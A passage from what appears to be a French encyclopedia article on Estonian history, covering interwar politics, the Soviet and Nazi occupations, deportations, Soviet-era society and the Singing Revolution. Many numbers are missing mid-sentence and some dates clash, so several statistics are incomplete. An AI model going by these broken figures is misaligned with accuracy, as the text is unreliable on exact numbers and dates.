Les villes estoniennes s'agrandissent : Tallinn compte à la veille de la Seconde Guerre mondiale contre en 1919. Elle est suivie par Tartu (), Narva et Pärnu. Malgré l'un des taux de natalité les plus faibles d'Europe, les Estoniens de souche forment désormais 85,5 % de la population (1934), suivis par les russophones 8,2 %, qui rassemblent des populations aux origines très diverses : vieux-croyants, russes blancs ayant fui la Révolution russe, ouvriers et artisans. L'estonisation des élites progresse rapidement : la proportion de germanophones dans le corps des pasteurs passe de 54 à 17 %. Le constat est le même dans l'ensemble des professions libérales. Par ailleurs, la proportion de germanophones dans la population diminue, passant à 1,5 % en 1934 : beaucoup ont émigré et leur taux de natalité est encore plus faible que celui de la population de souche estonienne.
La vie politique dans l'entre-deux-guerres.
Les débuts du régime parlementaire.
Les principaux partis politiques actifs entre les deux guerres mondiales sont le parti agrarien de Päts situé très à droite sur l'échiquier politique qui place la ferme estonienne au cœur de la nation, le parti populaire de Tönisson nationaliste et libéral bien implanté parmi l'intelligentsia nationaliste et la bourgeoisie urbaine dont Poska est également membre, le Parti travailliste estonien de Strandmann qui prône un socialisme non marxiste et le Parti socialiste des travailleurs estoniens de Rei doté d'un programme social-démocrate, membre de la Deuxième Internationale mais hostile aux communistes. Plusieurs petits partis représentent des groupes d'intérêts ou des minorités linguistiques. Les bolcheviks estoniens qui ont survécu au conflit fondent clandestinement en novembre 1920 le Parti communiste d'Estonie qui comprend en 1924. Kingnissep, son chef, est exécuté en 1922. Le parti présente malgré tout des candidats sous des étiquettes de partis prête-noms qui parviennent à remporter 10 % des sièges aux élections législatives de 1923, et aux élections municipales qui ont lieu la même année 36 % à Tallinn et 25 % à Tartu. Moscou, qui n'a pas renoncé aux territoires baltes, utilise le parti pour tenter d'organiser un soulèvement contre le régime en place en décembre 1924. La tentative, qui n'a pu rassembler que , échoue et il s'ensuit une répression sévère qui se traduit par 155 condamnations à mort. Cet épisode affaiblit considérablement l'audience du parti jusqu'à la fin de la période.
Au début de l'existence de l'Estonie, les partis de gauche non communiste remportent 30 % des voix tandis que la droite agrarienne séduit environ 25 % des électeurs. Les gouvernements qui se succèdent durant les années 1920 rassemblent généralement une coalition de centristes et d'agrariens. La nature du régime parlementaire mis en place ainsi que la coexistence d'un grand nombre de partis (jusqu'à 14 en 1923) ne favorisent pas la stabilité gouvernementale ; comme en France et en Allemagne à la même époque, la durée de vie des gouvernements est généralement brève (un peu plus de dix mois entre 1920 et 1934). Le défilé au pouvoir d'un personnel politique, déchiré par des querelles de personnes plus que sur des programmes, et des campagnes de signatures incessantes pour l'organisation de référendums, écornent fortement l'image du régime auprès des électeurs ; un courant d'antiparlementarisme gagne rapidement en audience à la fin des années 1920 comme un petit peu partout en Europe.
La montée du populisme.
Une association d'anciens combattants sait alors transformer le mécontentement général en un mouvement politique. La Ligue des vétérans de la guerre d'Indépendance ("Eesti Vabadussõjalaste Liit") prend le relais en 1926 de plusieurs associations du même type. Ses objectifs, initialement plutôt corporatistes (priorité aux vétérans de la guerre d'indépendance sur le marché du travail), se transforment en programme populiste à partir de 1931 : le mouvement réclame une réduction drastique du nombre de députés, jugés inutiles, la mise en place d'un régime présidentiel fort, l'annulation des dettes de guerre et des subventions aux partis officiels et aux organisations culturelles, la lutte contre la corruption. Pour empêcher la Ligue de lancer un référendum soutenant son projet, les partis officiels soumettent leur propre programme de réforme du régime qui ne recueille que 49,2 % des suffrages exprimés. Dans un climat de crise économique aggravé et d'instabilité gouvernementale croissante (quatre cabinets se succèdent en deux ans), le parti de Tönisson lance un nouveau référendum en juin 1933, qui est rejeté par 67,3 % des voix. En août, le gouvernement dissout la Ligue et proclame l'état d'urgence sans mettre un terme à l'agitation. Finalement le gouvernement se résigne à soumettre au vote les propositions de réforme de la Ligue, avec le soutien de Päts et Laidoner. La nouvelle constitution est approuvée avec 77,9 % des voix et entre en vigueur en 1934. En attendant l'élection d'un président, un gouvernement de transition dirigé par Päts remplace celui de Tönisson qui, hostile au référendum, a dû démissionner. Les principaux candidats aux premières élections présidentielles sont Päts, Laidoner, Rei qui représente l'aile gauche, et enfin Andres Larka, président de la Ligue, donné grand favori. Mais Päts, qui sait ne pouvoir l'emporter, décide en accord avec Laidoner de prendre le pouvoir au nom de la défense de l'Estonie. Le 12 mars 1934, il rétablit l'état d'urgence qui avait été levé, nomme Laidoner commandant des forces armées et dissout la Ligue en utilisant le prétexte fallacieux que celle-ci prépare un coup d'État. Tous les responsables du mouvement, hormis Larka, sont arrêtés. La Ligue ne s'en remettra pas, d'autant qu'elle est déconsidérée par une tentative de coup d'État menée en décembre 1935.
L'Ère du silence (1934-1939).
La période qui suit et se prolonge jusqu'à l'invasion soviétique de 1939 est appelée l'« Ère du silence » ("Vaikiv ajastu"). Le putsch ne suscite pas de forte opposition. Les socialistes et les milieux intellectuels sont soulagés que le danger d'un fascisme soit écarté ; de nombreux Estoniens redoutaient que l'arrivée au pouvoir du mouvement soit le prélude d'une guerre civile. La reprise économique qui se manifeste à cette époque contribue également sans aucun doute à calmer l'opposition. Néanmoins, le régime qui est mis en place par Päts n'a rien d'une démocratie : la constitution est suspendue et l'état d'urgence est maintenu tout au long de la période, les partis sont interdits et remplacés par une unique Ligue patriotique. La censure est sévère. Un office de propagande est chargé de mettre en avant la primauté du groupe sur l'individu, le patriotisme ( Estoniens abandonnent à l'époque leurs patronymes aux consonances germaniques) et les valeurs rurales. Une nouvelle constitution entre en vigueur en janvier 1938. Le nouveau régime est bicaméral. La chambre basse est élue au suffrage universel tandis que les de la chambre haute ou Conseil d'État sont désignés par diverses institutions (chambres corporatives, institutions), le président se chargeant de désigner dix d'entre eux. Le président est lui-même désigné par un collège de grands électeurs comprenant les membres des deux chambres et des représentants des collectivités locales. Les premières élections ont lieu en 1938. Les opposants peuvent se présenter mais les partis sont toujours interdits. Finalement, sur 80 sont acquis à l'opposition mais dix de ces élus se rallient peu après au courant majoritaire.
Un contexte international de plus en plus menaçant.
La naissance de l'Estonie indépendante ainsi que de celles des autres pays baltes se réalise aux dépens de ses deux puissants voisins, l'Allemagne et la Russie soviétique. Cette situation dangereuse semble compensée au début des années 1920 par la volonté de la France et le Royaume-Uni de maintenir un cordon sanitaire autour de la Russie bolchevique, dont fait partie l'Estonie. Un rapprochement avec la Russie, un temps espéré, est tué dans l'œuf par la tentative de putsch de 1924 téléguidée depuis Moscou. À partir des années 1930 la situation se tend en Europe avec l'incapacité de la Société des Nations à résoudre les conflits, la montée en puissance des dictatures et la crise économique qui avive les tensions et paralyse les démocraties. L'Estonie tente de signer des traités de protection bilatéraux avec le Royaume-Uni ou la France mais ces deux puissances se désintéressent désormais de la région. Une union des pays baltes, encouragée par les puissances occidentales, ne suscite qu'un intérêt très modéré des dirigeants estoniens qui estiment que les trois nations ont peu d'objectifs communs. L'Estonie cherche en vain à conclure un accord de défense avec la Finlande, qui n'y voit aucun intérêt, et avec la Suède qui se réfugie derrière son statut d'État neutre.
Seconde guerre mondiale et occupation (1939-1991).
La première occupation soviétique.
Au début de 1939, dans un contexte international de plus en plus tendu, La France et le Royaume-Uni décident de mettre fin à la politique de conciliation avec l'Allemagne nazie qui se fait menaçante ; les dirigeants négocient avec l'Union soviétique pour obtenir son soutien. Mais les pourparlers s'enlisent et à la surprise des alliés, l'URSS signe finalement avec l'Allemagne le Pacte germano-soviétique ou « Pacte Molotov-Ribbentrop » le 23 août 1939. Ce traité de non-agression comporte des clauses secrètes délimitant les zones d'influence de l'Allemagne et l'URSS. Les dirigeants soviétiques, qui n'ont pas accepté l'indépendance des pays baltes qui prive l'Union soviétique d'un accès à une mer libre de glaces sur sa façade occidentale, obtiennent des Allemands que l'Estonie comme la Lettonie soient inclus dans la zone d'influence de l'URSS. Le septembre l'armée allemande, qui ne court plus le risque désormais d'avoir à lutter sur deux fronts, envahit la Pologne, déclenchant l'entrée en guerre de la France et du Royaume-Uni et le début de la Seconde Guerre mondiale. Constatant que le conflit tourne à l'avantage de l'Allemagne, Staline déclare à son tour la guerre à la Pologne le 17 septembre et l'Armée rouge pénètre dans la partie orientale de celle-ci conformément au pacte.
L'Estonie se déclare immédiatement neutre, mais les dirigeants soviétiques exigent des négociations en exerçant un blocus maritime et terrestre du pays pour appuyer leur demande. Le président Konstantin Päts, qui sait que son pays est isolé, accepte de signer le 28 septembre un traité d'assistance mutuelle qui permet aux Soviétiques d'installer des bases navales sur le territoire estonien. L'Armée soviétique installe peu après des troupes terrestres en violation de ces accords. Adolf Hitler a négocié dans le cadre du pacte le rapatriement des germanophones sur le territoire allemand : ceux-ci doivent devenir les nouveaux colons de l'Allemagne agrandie. La quasi-totalité des Germano-baltes estoniens, soit , acceptent de répondre à l'appel du gouvernement nazi et quittent l'Estonie entre octobre 1939 et 1941, mettant fin à une présence qui avait marqué le pays depuis le .
La défaite des alliés sur le front occidental permet à l'Union soviétique de franchir l'étape suivante. Le jour de l'entrée des troupes allemandes dans Paris (14 juin 1940), Moscou déclenche des incidents aux frontières des pays baltes puis adresse un nouvel ultimatum en prétextant que le pacte d'assistance mutuelle signé par ceux-ci en 1934 constitue une grave menace pour l'URSS. Les gouvernements baltes sont sommés d'ouvrir leur frontière aux troupes russes. L'Estonie, comme ses voisins, obtempère et, dans la nuit du 16 au 17 juin, et 600 tanks pénètrent sur son territoire sans rencontrer de résistance et prennent possession des principaux points stratégiques. Le général Johan Laidoner doit signer le « diktat de Narva » qui impose la restitution des armes, place les moyens de communication sous le contrôle de l'URSS et interdit les réunions politiques. Le gouvernement Uulots, sous la pression de pseudo manifestants, laisse la place à une nouvelle équipe composée en partie d'intellectuels non communistes dirigés par le médecin et poète Johannes Vares. Des élections largement truquées sont organisées à la mi-juillet : presque tous les candidats d'opposition sont récusés ; ceux présentés par les communistes remportent 93 % des votes avec une participation de 84 %. Le président Päts est démis de ses fonctions par l'assemblée et les élus proclament la république socialiste soviétique d'Estonie et demandent son incorporation à l'URSS. Le 6 août 1940, l'Estonie intègre officiellement l'Union soviétique. Le NKVD soviétique mène immédiatement une campagne de purge. Les principaux cadres dirigeants estoniens sont arrêtés et remplacés par des communistes, dont de nombreux Estoniens ayant résidé en URSS. Les Estoniens interpellés sont déportés en Russie ou parfois fusillés sur place. L'Estonie est dotée d'institutions soviétiques. L'assemblée prend l'appellation de Soviet suprême et l'exécutif est confié au Conseil des commissaires du peuple dirigé par Johanes Lauristin. Le parti communiste, qui compte environ , est institué parti unique.
L'économie est entièrement nationalisée hormis le commerce de détail. En principe les propriétés agricoles ne sont pas concernées par ces mesures mais environ un quart des terres sont confisquées sous des prétextes divers. Le marché du travail est désormais géré par les planificateurs soviétiques qui réaffectent les ouvriers estoniens au gré de la demande. Près de estoniens sont ainsi déportés à l'extérieur de l'Estonie. Le niveau de vie s'effondre. L'enseignement de l'histoire est entièrement revu ; les cours de marxisme-léninisme et de russe sont mis en avant tandis que les cours de religion et de langues anciennes disparaissent. La presse est placée sous le contrôle de l'État. Au printemps 1941, la tension croissante entre l'URSS et l'Allemagne entraîne un accroissement de la répression dans toutes les régions annexées récemment. Environ Estoniens sont arrêtés entre janvier et juillet 1941, puis plus de (soit 1 % de la population estonienne) sont arrêtées le 14 juin au terme d'une opération soigneusement préparée et qui touche tous les pays baltes. Une grande partie des hommes arrêtés sont exécutés sur place ou en Union soviétique et la plupart des femmes et des enfants ne survivront pas à l'épreuve des camps. Une semaine plus tard, le 22 juin, l'Allemagne déclenche l'opération Barbarossa contre l'Union soviétique. Dès l'annonce de la guerre, les atrocités se multiplient sur le territoire estonien, tandis que Estoniens sont incorporés de force dans l'Armée Rouge dont moins de la moitié reviendra vivants du conflit. Les armées allemandes, qui ont rapidement enfoncé le front soviétique, sont accueillies en libérateur par les Estoniens qui voient la fin de leur cauchemar. Une force de guérilla de plus de Estoniens contribue spontanément à la libération du territoire de l'occupant soviétique. Les combats sur le territoire estonien, débutés le 7 juillet, s'achèvent le 21 octobre. Les Soviétiques avaient évacué environ proches collaborateurs.
L'occupation allemande (1941-1944).
Il n'est pas question pour l'Allemagne nazie de rendre son indépendance, même de manière symbolique, à l'Estonie. Le pays est rattaché administrativement au Reichskommissariat Ostland qui comprend également la Biélorussie ainsi que les autres pays baltes ; le programme d'épuration ethnique "Generalplan Ost" lui est appliquée. L'occupant ménage toutefois les finno-ougriens qui, dans sa vision raciste du monde, font partie des peuples nordiques, donc supérieurs aux slaves et "a fortiori" aux juifs et à qui, de plus, une élite germanophone a montré l'exemple durant plusieurs siècles. Les exactions durant l'occupation allemande sont essentiellement limitées aux minorités que le régime nazi pourchasse : les Juifs qui n'ont pas fui, soit un quart des effectifs qui comptait plus de avant guerre, sont éliminés impitoyablement entre août et décembre 1941, ainsi qu'un nombre de Tsiganes peut-être équivalent, et , résistants et membres de bataillons de destruction. Par ailleurs, une dizaine de milliers de Juifs en provenance des pays voisins périssent dans des camps de concentration installés sur le territoire estonien, ainsi qu'environ prisonniers de guerre russes. Le 19 septembre 1944, à la veille du retour de l'Armée rouge, l'occupant perpétue le plus grand massacre qu'ait connu l'Estonie au camp de concentration de Klooga en éliminant sauvagement environ personnes, essentiellement des Juifs. Une petite minorité d'Estoniens, motivée essentiellement par l'anti-communisme, collabore avec les Allemands. Néanmoins les forces de sécurité estoniennes jouent un rôle actif dans les arrestations et les autochtones fournissent l'essentiel de l'encadrement des camps de prisonniers et des camps de concentration.
L'occupant accepte, à la demande des Estoniens, la constitution d'une milice chargée de poursuivre les communistes et de maintenir l'ordre, mais ce corps, populaire au début de l'occupation, perd rapidement tout attrait. En août 1942, les dirigeants nazis décident de constituer un corps de la "Waffen-SS" estonienne, nommé division SS de grenadiers, qui ne réussit à recruter que 500 volontaires. À partir de février 1943, les classes 37 à 42 sont mobilisées par les Allemands sans grand succès : si plus du tiers des appelés sont malgré tout incorporés ou envoyés en Allemagne dans les industries de guerre, près de jeunes gens rejoignent l'armée finlandaise qui combat l'Armée rouge tandis que le reste prend le maquis.
La deuxième occupation soviétique (1944-1991).
L'invasion soviétique.
À partir de 1943, les troupes allemandes, qui s'étaient profondément avancées dans le territoire soviétique, reculent. Début 1944, elles établissent une ligne de défense sur la Narva. À l'approche de l'Armée rouge qui avance inexorablement, un appel lancé par Uulots, le chef de gouvernement d'avant-guerre, parvient à mobiliser de à pour repousser un envahisseur particulièrement redouté. Au total, près de Estoniens se battent au côté des forces allemandes et parviennent à bloquer l'Armée rouge durant six mois dans l'Est de l'Estonie. Durant cette phase de la bataille, les bombardements aériens soviétiques détruisent le centre de Narva et de Tallinn. Mais l'évolution du conflit sur d'autres fronts et l'armistice demandé par la Finlande qui fait peser une menace sur l'ensemble de la côte balte entraînent le retrait des troupes allemandes, et finalement Tallinn tombe le 22 septembre 1944 ; la conquête de l'Estonie s'achève en novembre 1944. L'invasion de l'Armée rouge provoque un exode massif de la population qui craint des représailles comme celles qu'ont subies certains peuples caucasiens de l'URSS dans des circonstances similaires. Durant l'été 1944, près de soit 9 % de la population prennent la mer et tentent de s'échapper. Entre et d'entre elles périssent en chemin, victimes des chasseurs-bombardiers soviétiques qui attaquent les bateaux chargés de civils. Les survivants débarquent pour un tiers en Suède, le reste en Allemagne d'où la plupart gagneront par la suite l'Amérique du Nord. Cet exode est une catastrophe pour l'Estonie qui perd une grande partie de ses élites intellectuelles, du corps enseignant et des cadres religieux déjà décimés par les massacres qui ont précédé. À l'issue de ces événements, il ne reste plus que 25 % du corps professoral en Estonie ; le pays a perdu par ailleurs 20 % de sa population d'avant-guerre.
Le temps de la répression (1944-1949).
Avant même que les combats en Estonie ne s'achèvent, les dirigeants soviétiques décident d'amputer le pays de plusieurs territoires représentant 5 % de sa superficie (la rive droite de la Narva et la région de Petchory). Il s'agit de lieux susceptibles de jouer un rôle stratégique et que l'URSS souhaite conserver dans l'éventualité de traités de paix qui l'obligeraient à restituer son indépendance à l'Estonie. Des campagnes d'arrestation reprennent et touchent entre 1944 et 1949 environ , dont un tiers est fusillé ou meurt dans des camps, le reste étant déporté. Les Estoniens qui ont lutté contre l'Armée Rouge et n'ont pu fuir le pays, ainsi qu'une partie de ceux qui ont refusé de se laisser enrôler par les Soviétiques, prennent le maquis comme dans les autres pays baltes : les frères de la forêt, qui sont dans les années 1945-1947 soit 4 % de la population, luttent avec l'espoir que les forces alliées viendront délivrer le pays de l'occupation soviétique. Le mouvement, bien que mal organisé, mal armé et pratiquement dépourvu de soutien extérieur, parvient à survivre et à mener des actions jusqu'en 1949. Pour à la fois briser le mouvement et la résistance à la collectivisation agraire en cours, les autorités soviétiques réalisent entre le 25 et 29 mars 1949 une déportation massive des paysans les plus entreprenants et des personnes ayant des activités politiques ou culturelles : Estoniens sont envoyés en Russie d'Europe et en Sibérie, généralement dans des exploitations agricoles. Ils reviendront progressivement, à partir de la mort de Staline. Le mouvement des frères de la forêt, désormais pratiquement coupé de son soutien logistique, et impitoyablement pourchassé, s'affaiblit progressivement par la suite. Après 1960, la répression diminue et les déportations cessent.
Les organes de direction de la république socialiste soviétique d'Estonie.
La république socialiste soviétique d'Estonie, créée par l'URSS au travers d'élections truquées pour administrer le territoire, est dotée d'un conseil des ministres et d'une assemblée législative élue au suffrage universel sur liste unique. Elle n'est pratiquement jamais convoquée. Le pouvoir réel est exercé par le Parti communiste d'Estonie qui est une section locale du Parti communiste d'URSS. Du vivant de Staline (1945-1953), le parti ne fait que mettre en œuvre les instructions venues de Moscou. Il accède à une certaine autonomie par la suite en particulier lorsque Khrouchtchev accède au pouvoir (1956-1964). Le parti, qui compte en 1946, en rassemble en 1988. Mais les Estoniens restent durant toute la période d'occupation minoritaires au sein du parti et de sa direction. En 1953 ils ne représentent que 44 % des effectifs du parti dont un tiers sont des « ïestoniens » (surnom donné aux Estoniens élevés ou ayant vécu en Russie reconnaissables à leur prononciation du E à la russe) ; la proportion des Estoniens de souche s'accroît par la suite mais en 1981 ils ne représentent toujours que 49 % des effectifs du parti. Au comité central et à la direction du parti la proportion est encore plus faible. Durant cette période les trois dirigeants qui se succèdent à la tête du parti et qui, à ce titre, exercent le pouvoir réel sur l'Estonie, sont tous des Estoniens russifiés : Nikolai Karotamm qui dirige le parti jusqu'en 1950 a passé en Russie, Johannes Käbin qui prend sa suite et se maintient à ce poste jusqu'en 1978, a vécu à partir de l'âge de cinq ans en Russie et a dû réapprendre l'estonien tandis que Karl Vaino, qui remplace Käbin en 1978, est né en Russie, arrive en Estonie à ne parlera jamais couramment la langue du pays. Mais il n'y a toutefois pas un véritable rejet du système puisque près de 20 % des familles estoniennes comptent au moins un membre dans le parti à la veille de l'indépendance et qu'une grande partie de l'intelligentsia estonienne y adhère. Le mouvement indépendantiste de la fin des années 1980 sera d'ailleurs largement mené par des membres du parti communiste estonien comme Edgar Savisaar qui par la suite assumeront des responsabilités au sein du pays redevenu indépendant.
L'économie collectivisée.
Au sortir de la guerre, l'Estonie est ravagée : les villes sont en grande partie détruites (Tallinn à 50 %, Narva à 97 %), ainsi que les établissements industriels (45 %). L'industrie est nationalisée et Moscou donne la priorité aux investissements dans l'industrie lourde, en particulier les industries énergétiques : l'extraction des schistes bitumineux de Virumaa est développée. Deux centrales thermiques (en 1975) brûlent une partie de la production et alimentent en énergie la mégapole de Leningrad. Après la mort de Staline, les responsables de la planification soviétique décident de spécialiser la région dans la production de machines-outils et de produits agro-alimentaires. Les établissements industriels les plus importants sont implantés dans la région de Tallinn. La croissance de l'industrie lourde très forte (+36 % entre 1946 et 1950 puis +14 % entre 1951 et 1955,+11,4 % de 1956 à 1960, +4,4 % de 1976 à 1980), qui fait de l'Estonie le meilleur élève de toutes les républiques socialistes, nécessite le recours à une main d'œuvre importante qui afflue depuis les régions russes avoisinantes. Le prix écologique est particulièrement lourd : la Virumaa est ravagée par les carrières d'extraction à ciel ouvert, les centrales thermiques, compte tenu du combustible utilisé, sont particulièrement polluantes. La mer Baltique et les côtes sont fortement dégradées par les effluents industriels en l'absence de stations d'épuration.
L'agriculture n'est pas immédiatement collectivisée car l'organisation du nouveau pouvoir n'est pas encore suffisamment étoffée. Les premiers kolkhozes apparaissent en 1947 ; ils se généralisent immédiatement après la déportation de 1949 destinée à briser toute résistance et les dernières fermes disparaissent en 1952. L'Estonie compte, en 1953, 934 kolkhozes agricoles (152 en 1985), 84 kolkhozes de pêche (8 en 1985), 115 sovkhozes (152 en 1985), tandis que les lopins individuels représentent 8 % de la superficie cultivée (4 % en 1985). Comme dans le reste de l'URSS la nouvelle organisation se traduit d'abord par une baisse de 10 % de la production agricole entre 1950 et 1955. Malgré l'inefficacité du système, la production agricole de l'Estonie est, en 1980, de 75 % supérieure à celle de 1939. Les paysans estoniens travaillent particulièrement dur sur leurs lopins privés au point de devenir le premier producteur de concombre de l'URSS.
Dans les années 1950, les femmes sont nettement plus nombreuses que les hommes à travailler (54 % des emplois en 1954). Ce déséquilibre, qui se retrouve dans la composition de la population (65 % de femmes en 1959), découle à la fois de l'émigration, des déportations et des conflits passés. L'industrialisation entraîne une forte croissance des effectifs du secteur secondaire, qui dépassent en 1960 ceux du secteur primaire avant de se stabiliser à 35 % des emplois. En 1980, le secteur tertiaire représente 50 % des emplois, mais sa productivité, comme dans tous les pays socialistes, est particulièrement faible. Conséquence de cette nouvelle répartition, les villes estoniennes croissent rapidement et la population urbaine regroupe 71 % de la population en 1984 contre 31 % en 1945. La répartition entre les centres urbains est très déséquilibrée : Tallinn compte en 1980 soit un tiers de la population de l'Estonie.
La société estonienne durant l'ère soviétique.
Le niveau de vie, après avoir baissé immédiatement après guerre, augmente de nouveau et il est bientôt plus élevé en Estonie que dans toutes les autres républiques socialistes. Mais la qualité de vie en résultant est, comme dans le reste de l'URSS, très basse comparée aux standards occidentaux à la même époque : des pénuries surviennent régulièrement sur des aliments de base donnant lieu à un important marché noir, les produits manufacturés sont de mauvaise qualité et les produits importés inexistants, sauf pour une minorité de privilégiés. À compter des années 1960, la croissance se ralentit, puis la stagnation s'installe dans les années 1980. Lorsque les premiers contacts sont renoués avec la Finlande dans les années 1980, les Estoniens constatent qu'un fossé s'est creusé entre le niveau de vie des deux pays. Sous le nouveau régime la liberté de mouvement est restreinte. De nombreuses zones militaires sur la côte abritent des bases militaires russes ou des villes fermées comme Sillamäe, interdites d'accès. Pour empêcher les fuites vers la Suède, la circulation dans les îles et sur la côte est limitée, seules quelques plages sont ouvertes à la baignade et seulement de jour. À l'intérieur du pays, la circulation des personnes est contrôlée par un système de passeport intérieur et l'accès au logement est lié à l'emploi rendant tout déménagement difficile.
L'immigration russophone et la lutte pour la survie de la culture estonienne.
L'immigration massive des russophones dans le pays accompagne l'industrialisation rapide de l'après-guerre. La majorité des immigrants sont des ruraux venant des régions russes voisines, qui occupent des emplois peu qualifiés dans les usines : entre 1945 et 1953, les effectifs des Estoniens de souche, du fait des déportations et des exils massifs, passent de à tandis que russophones s'installent dans le pays. Cette immigration continue par la suite à un rythme plus lent : nouveaux arrivants entre 1953 et 1959, entre 1960 et 1989. La proportion des Estoniens passe de 88,2 % en 1934, à 74,6 % en 1959, 68,2 % en 1970 et 61,5 % en 1989. Entre 1953 et 1989, la population totale passe de d'habitants à , mais cette croissance démographique est pratiquement entièrement due à l'immigration, car le taux de natalité des Estoniens est durant toute cette période un des plus bas d'Europe et ne permet pas le renouvellement des générations (15 pour mille en 1970). La minorité russophone est d'autant plus visible qu'elle est concentrée dans les villes du Nord et de l'Est alors qu'elle est absente des campagnes : elle est majoritaire à Tallinn (53 % en 1989) et forme de véritables enclaves russes dans les régions les plus industrielles : 95 % à Narva, 75 % à Kohtla-Järve.
Il n'y a initialement pas de volonté délibérée des dirigeants soviétiques de faire disparaître la culture estonienne. L'estonien continue à être la langue d'enseignement dans les écoles estoniennes ainsi qu'à l'université, contrairement, dans ce dernier cas, à ce qui se passe en Ukraine. Mais en 1978, l'arrivée de Karl Vaino à la tête du Parti communiste d'Estonie est suivie par un changement de politique : l'enseignement du russe se fait désormais dès la première année du primaire. À partir de 1976, les thèses des doctorats doivent être rédigées en russe dans les matières scientifiques. En 1980, 83 % des programmes télévisés sont en russe. Dans l'administration, les formulaires en estonien disparaissent. Les discours lors des grandes cérémonies sont en russe. Mais les Estoniens résistent : en 1979 la proportion d'Estoniens qui déclarent parler le russe est la plus basse de tous les peuples de l'URSS (24 %). Les Russes installés en Estonie affichent le même désintérêt pour la langue locale avec 13 % de locuteurs en estonien.
La révolution chantante (1985-1991).
Mikhaïl Gorbatchev prend la tête de l'URSS en 1985. En rupture avec ses prédécesseurs il mise sur un programme de transparence (glasnost) pour reconstruire (perestroïka) le système économique soviétique peu efficace et qui ne parvient plus à assurer la croissance. Dans ce contexte apparemment moins répressif et alors que le monde est sous le choc de la catastrophe nucléaire de Tchernobyl (avril 1986), un mouvement écologique prend naissance en Estonie contre l'ouverture d'une nouvelle mine de phosphates et pour la première fois depuis le début de l'occupation soviétique les autorités reculent devant la pression populaire. À la même époque un Groupe estonien pour la publication des clauses secrètes du pacte germano-soviétique, dont les dirigeants soviétiques continuent de nier l'existence, organise le 23 août 1987 une manifestation à proximité du siège du gouvernement qui rassemble plusieurs milliers de personnes et qui n'est pas réprimée. Les commémorations sur des thèmes interdits – guerre d'indépendance, déportations de 1949 – se multiplient dans les mois qui suivent. Le drapeau tricolore estonien, banni depuis l'invasion soviétique, est brandi régulièrement dans les cortèges. Les Estoniens prennent l'habitude de se réunir pour chanter ouvertement des chansons nationalistes donnant son nom à la révolution pacifique en cours : la révolution chantante. Les dirigeants du Parti communiste estonien réagissent avec modération et tentent d'accompagner le mouvement. Edgar Savisaar, membre du parti et directeur du Comité du Plan, crée le Front populaire destiné à soutenir la perestroïka et à élargir l'espace de liberté qui vient de se créer pour l'Estonie. En juin 1988, sous la pression de Moscou qui souhaite obtenir l'adhésion des populations à son programme de réforme, le secrétaire du PCE, le russophile Vaino, est écarté au profit de l'estophile Vaino Väljas. Mais cela n'arrête pas la radicalisation du mouvement. Le Parti de l'indépendance nationale apparaît en août 1988 et réclame l'indépendance nationale. La revendication est reprise par un orateur au cours d'un festival de chant qui rassemble Estoniens. Contre-feu encouragé par les services secrets russes, le Front Internationaliste ou Interfront est créé en juin : il rassemble des russophones et estoniens hostiles à la montée du « nationalisme bourgeois » et à la « contre-révolution rampante ».
Le le contenu des clauses du Pacte germano-soviétique est dévoilé par le Soviet suprême de l'URSS. Conséquence de cette annonce, le Soviet suprême de l'Estonie déclare le résultat du scrutin de juillet 1940 illégal et la « libération » par l'Armée Rouge qui l'a précédé est redéfinie comme une annexion.
En octobre 1988, Gorbatchev propose une refonte des textes constitutionnels de l'Union soviétique qui est rejetée par les États baltes car, bien que libérale dans l'esprit, elle aboutirait à priver les républiques du droit de se retirer de l'Union. Le Soviet suprême d'Estonie adopte progressivement des positions de plus en plus nationalistes, qui aboutissent en novembre à un vote rétablissant la souveraineté juridique de l'Estonie. En janvier 1989, une loi votée réaffirme que l'estonien est la seule langue nationale et que les fonctionnaires et les employés en contact avec le public doivent en avoir la maîtrise. En mars 1989, pour la première fois des élections vraiment libres sont organisées pour choisir les représentants de l'Estonie au Congrès des représentants du peuple de l'URSS, qui est le nouvel organisme représentatif central mis sur en place par Gorbatchev. La consultation, qui recueille 87 % de participation, envoie du Front national sur 36 délégués, consacrant la défaite des conservateurs communistes russophiles. Le 23 août, date anniversaire du pacte germano-soviétique, sur une idée lancée par Savisaar, un à deux millions de personnes se donnent la main formant une chaîne humaine quasi continue d'environ de Tallinn, capitale de l'Estonie, à Vilnius , capitale de la Lituanie, en passant par Riga, capitale de la Lettonie, nommée la voie balte, pour demander l'indépendance des pays baltes. L'événement, qui par son caractère spectaculaire a un grand retentissement dans les médias internationaux, interpelle les dirigeants des pays occidentaux, jusque-là réticents à soutenir le mouvement d'indépendance qui pourrait enrayer la politique d'ouverture pratiquée par Moscou. Son succès raffermit par ailleurs la résolution des Baltes. Moscou tente, en vain, de raisonner les gouvernements des États baltes en marche vers l'indépendance en soutenant que celle-ci n'est pas viable compte tenu de la taille des États et de l'imbrication de leur économie dans l'ensemble soviétique.
L'Estonie est alors en pleine ébullition. Des centaines de rues et de places sont rebaptisées comme, à Tallinn, la place de la Victoire (de l'Armée Rouge) qui devient la place de la Liberté. Les programmes scolaires sont expurgés des ajouts ou déformations soviétiques, les témoignages écrits des survivants de la déportation dans les camps soviétiques sont publiés. Les journaux changent de ligne et parfois de titre comme "Edasi" (« En avant ») qui reprend le nom du principal journal d'avant-guerre "Postimees". À côté du Front national de Savisaar, de nouveaux partis apparaissent. Deux voies vers l'indépendance se dessinent : les partisans d'une démarche négociée sans rupture avec le régime précédent sont généralement issus de l'aile réformatrice du parti communiste comme Savisaar ; les membres notamment du parti de l'indépendance nationale, une partie des milieux dissidents, les Estoniens émigrés rejettent complètement le régime et veulent le retour à la situation d'avant 1940. En particulier, ils considèrent que les russophones installés sur le territoire depuis 1944, complices d'une tentative de génocide culturel, n'ont pas le droit de prendre part au débat politique. Ce courant initialement minoritaire, à qui l'on reproche d'envenimer les relations entre les deux communautés, est très actif auprès des gouvernements occidentaux et soviétique. Dans ce courant, des comités des citoyens décident d'organiser en mars 1989 des élections sur la base d'un corps électoral expurgé de sa composante considérée comme étrangère : les russophones émigrés depuis 1944 sont exclus tandis que les émigrés sont invités à participer au vote. Le scrutin, qui a lieu le 24 février, date anniversaire de l'accord de Tartu, est une réussite : votants élisent un Congrès sans pouvoir réel mais qui réaffirme le cadre illégal du régime mis en place par l'Union soviétique. Une semaine plus tard, les élections de l'assemblée officielle, le Soviet Suprême d'Estonie, rassemblent votants et consacrent l'effondrement du PCE qui ne recueille que 3,6 % des suffrages. Le Front populaire arrive en tête avec 24 % des voix.
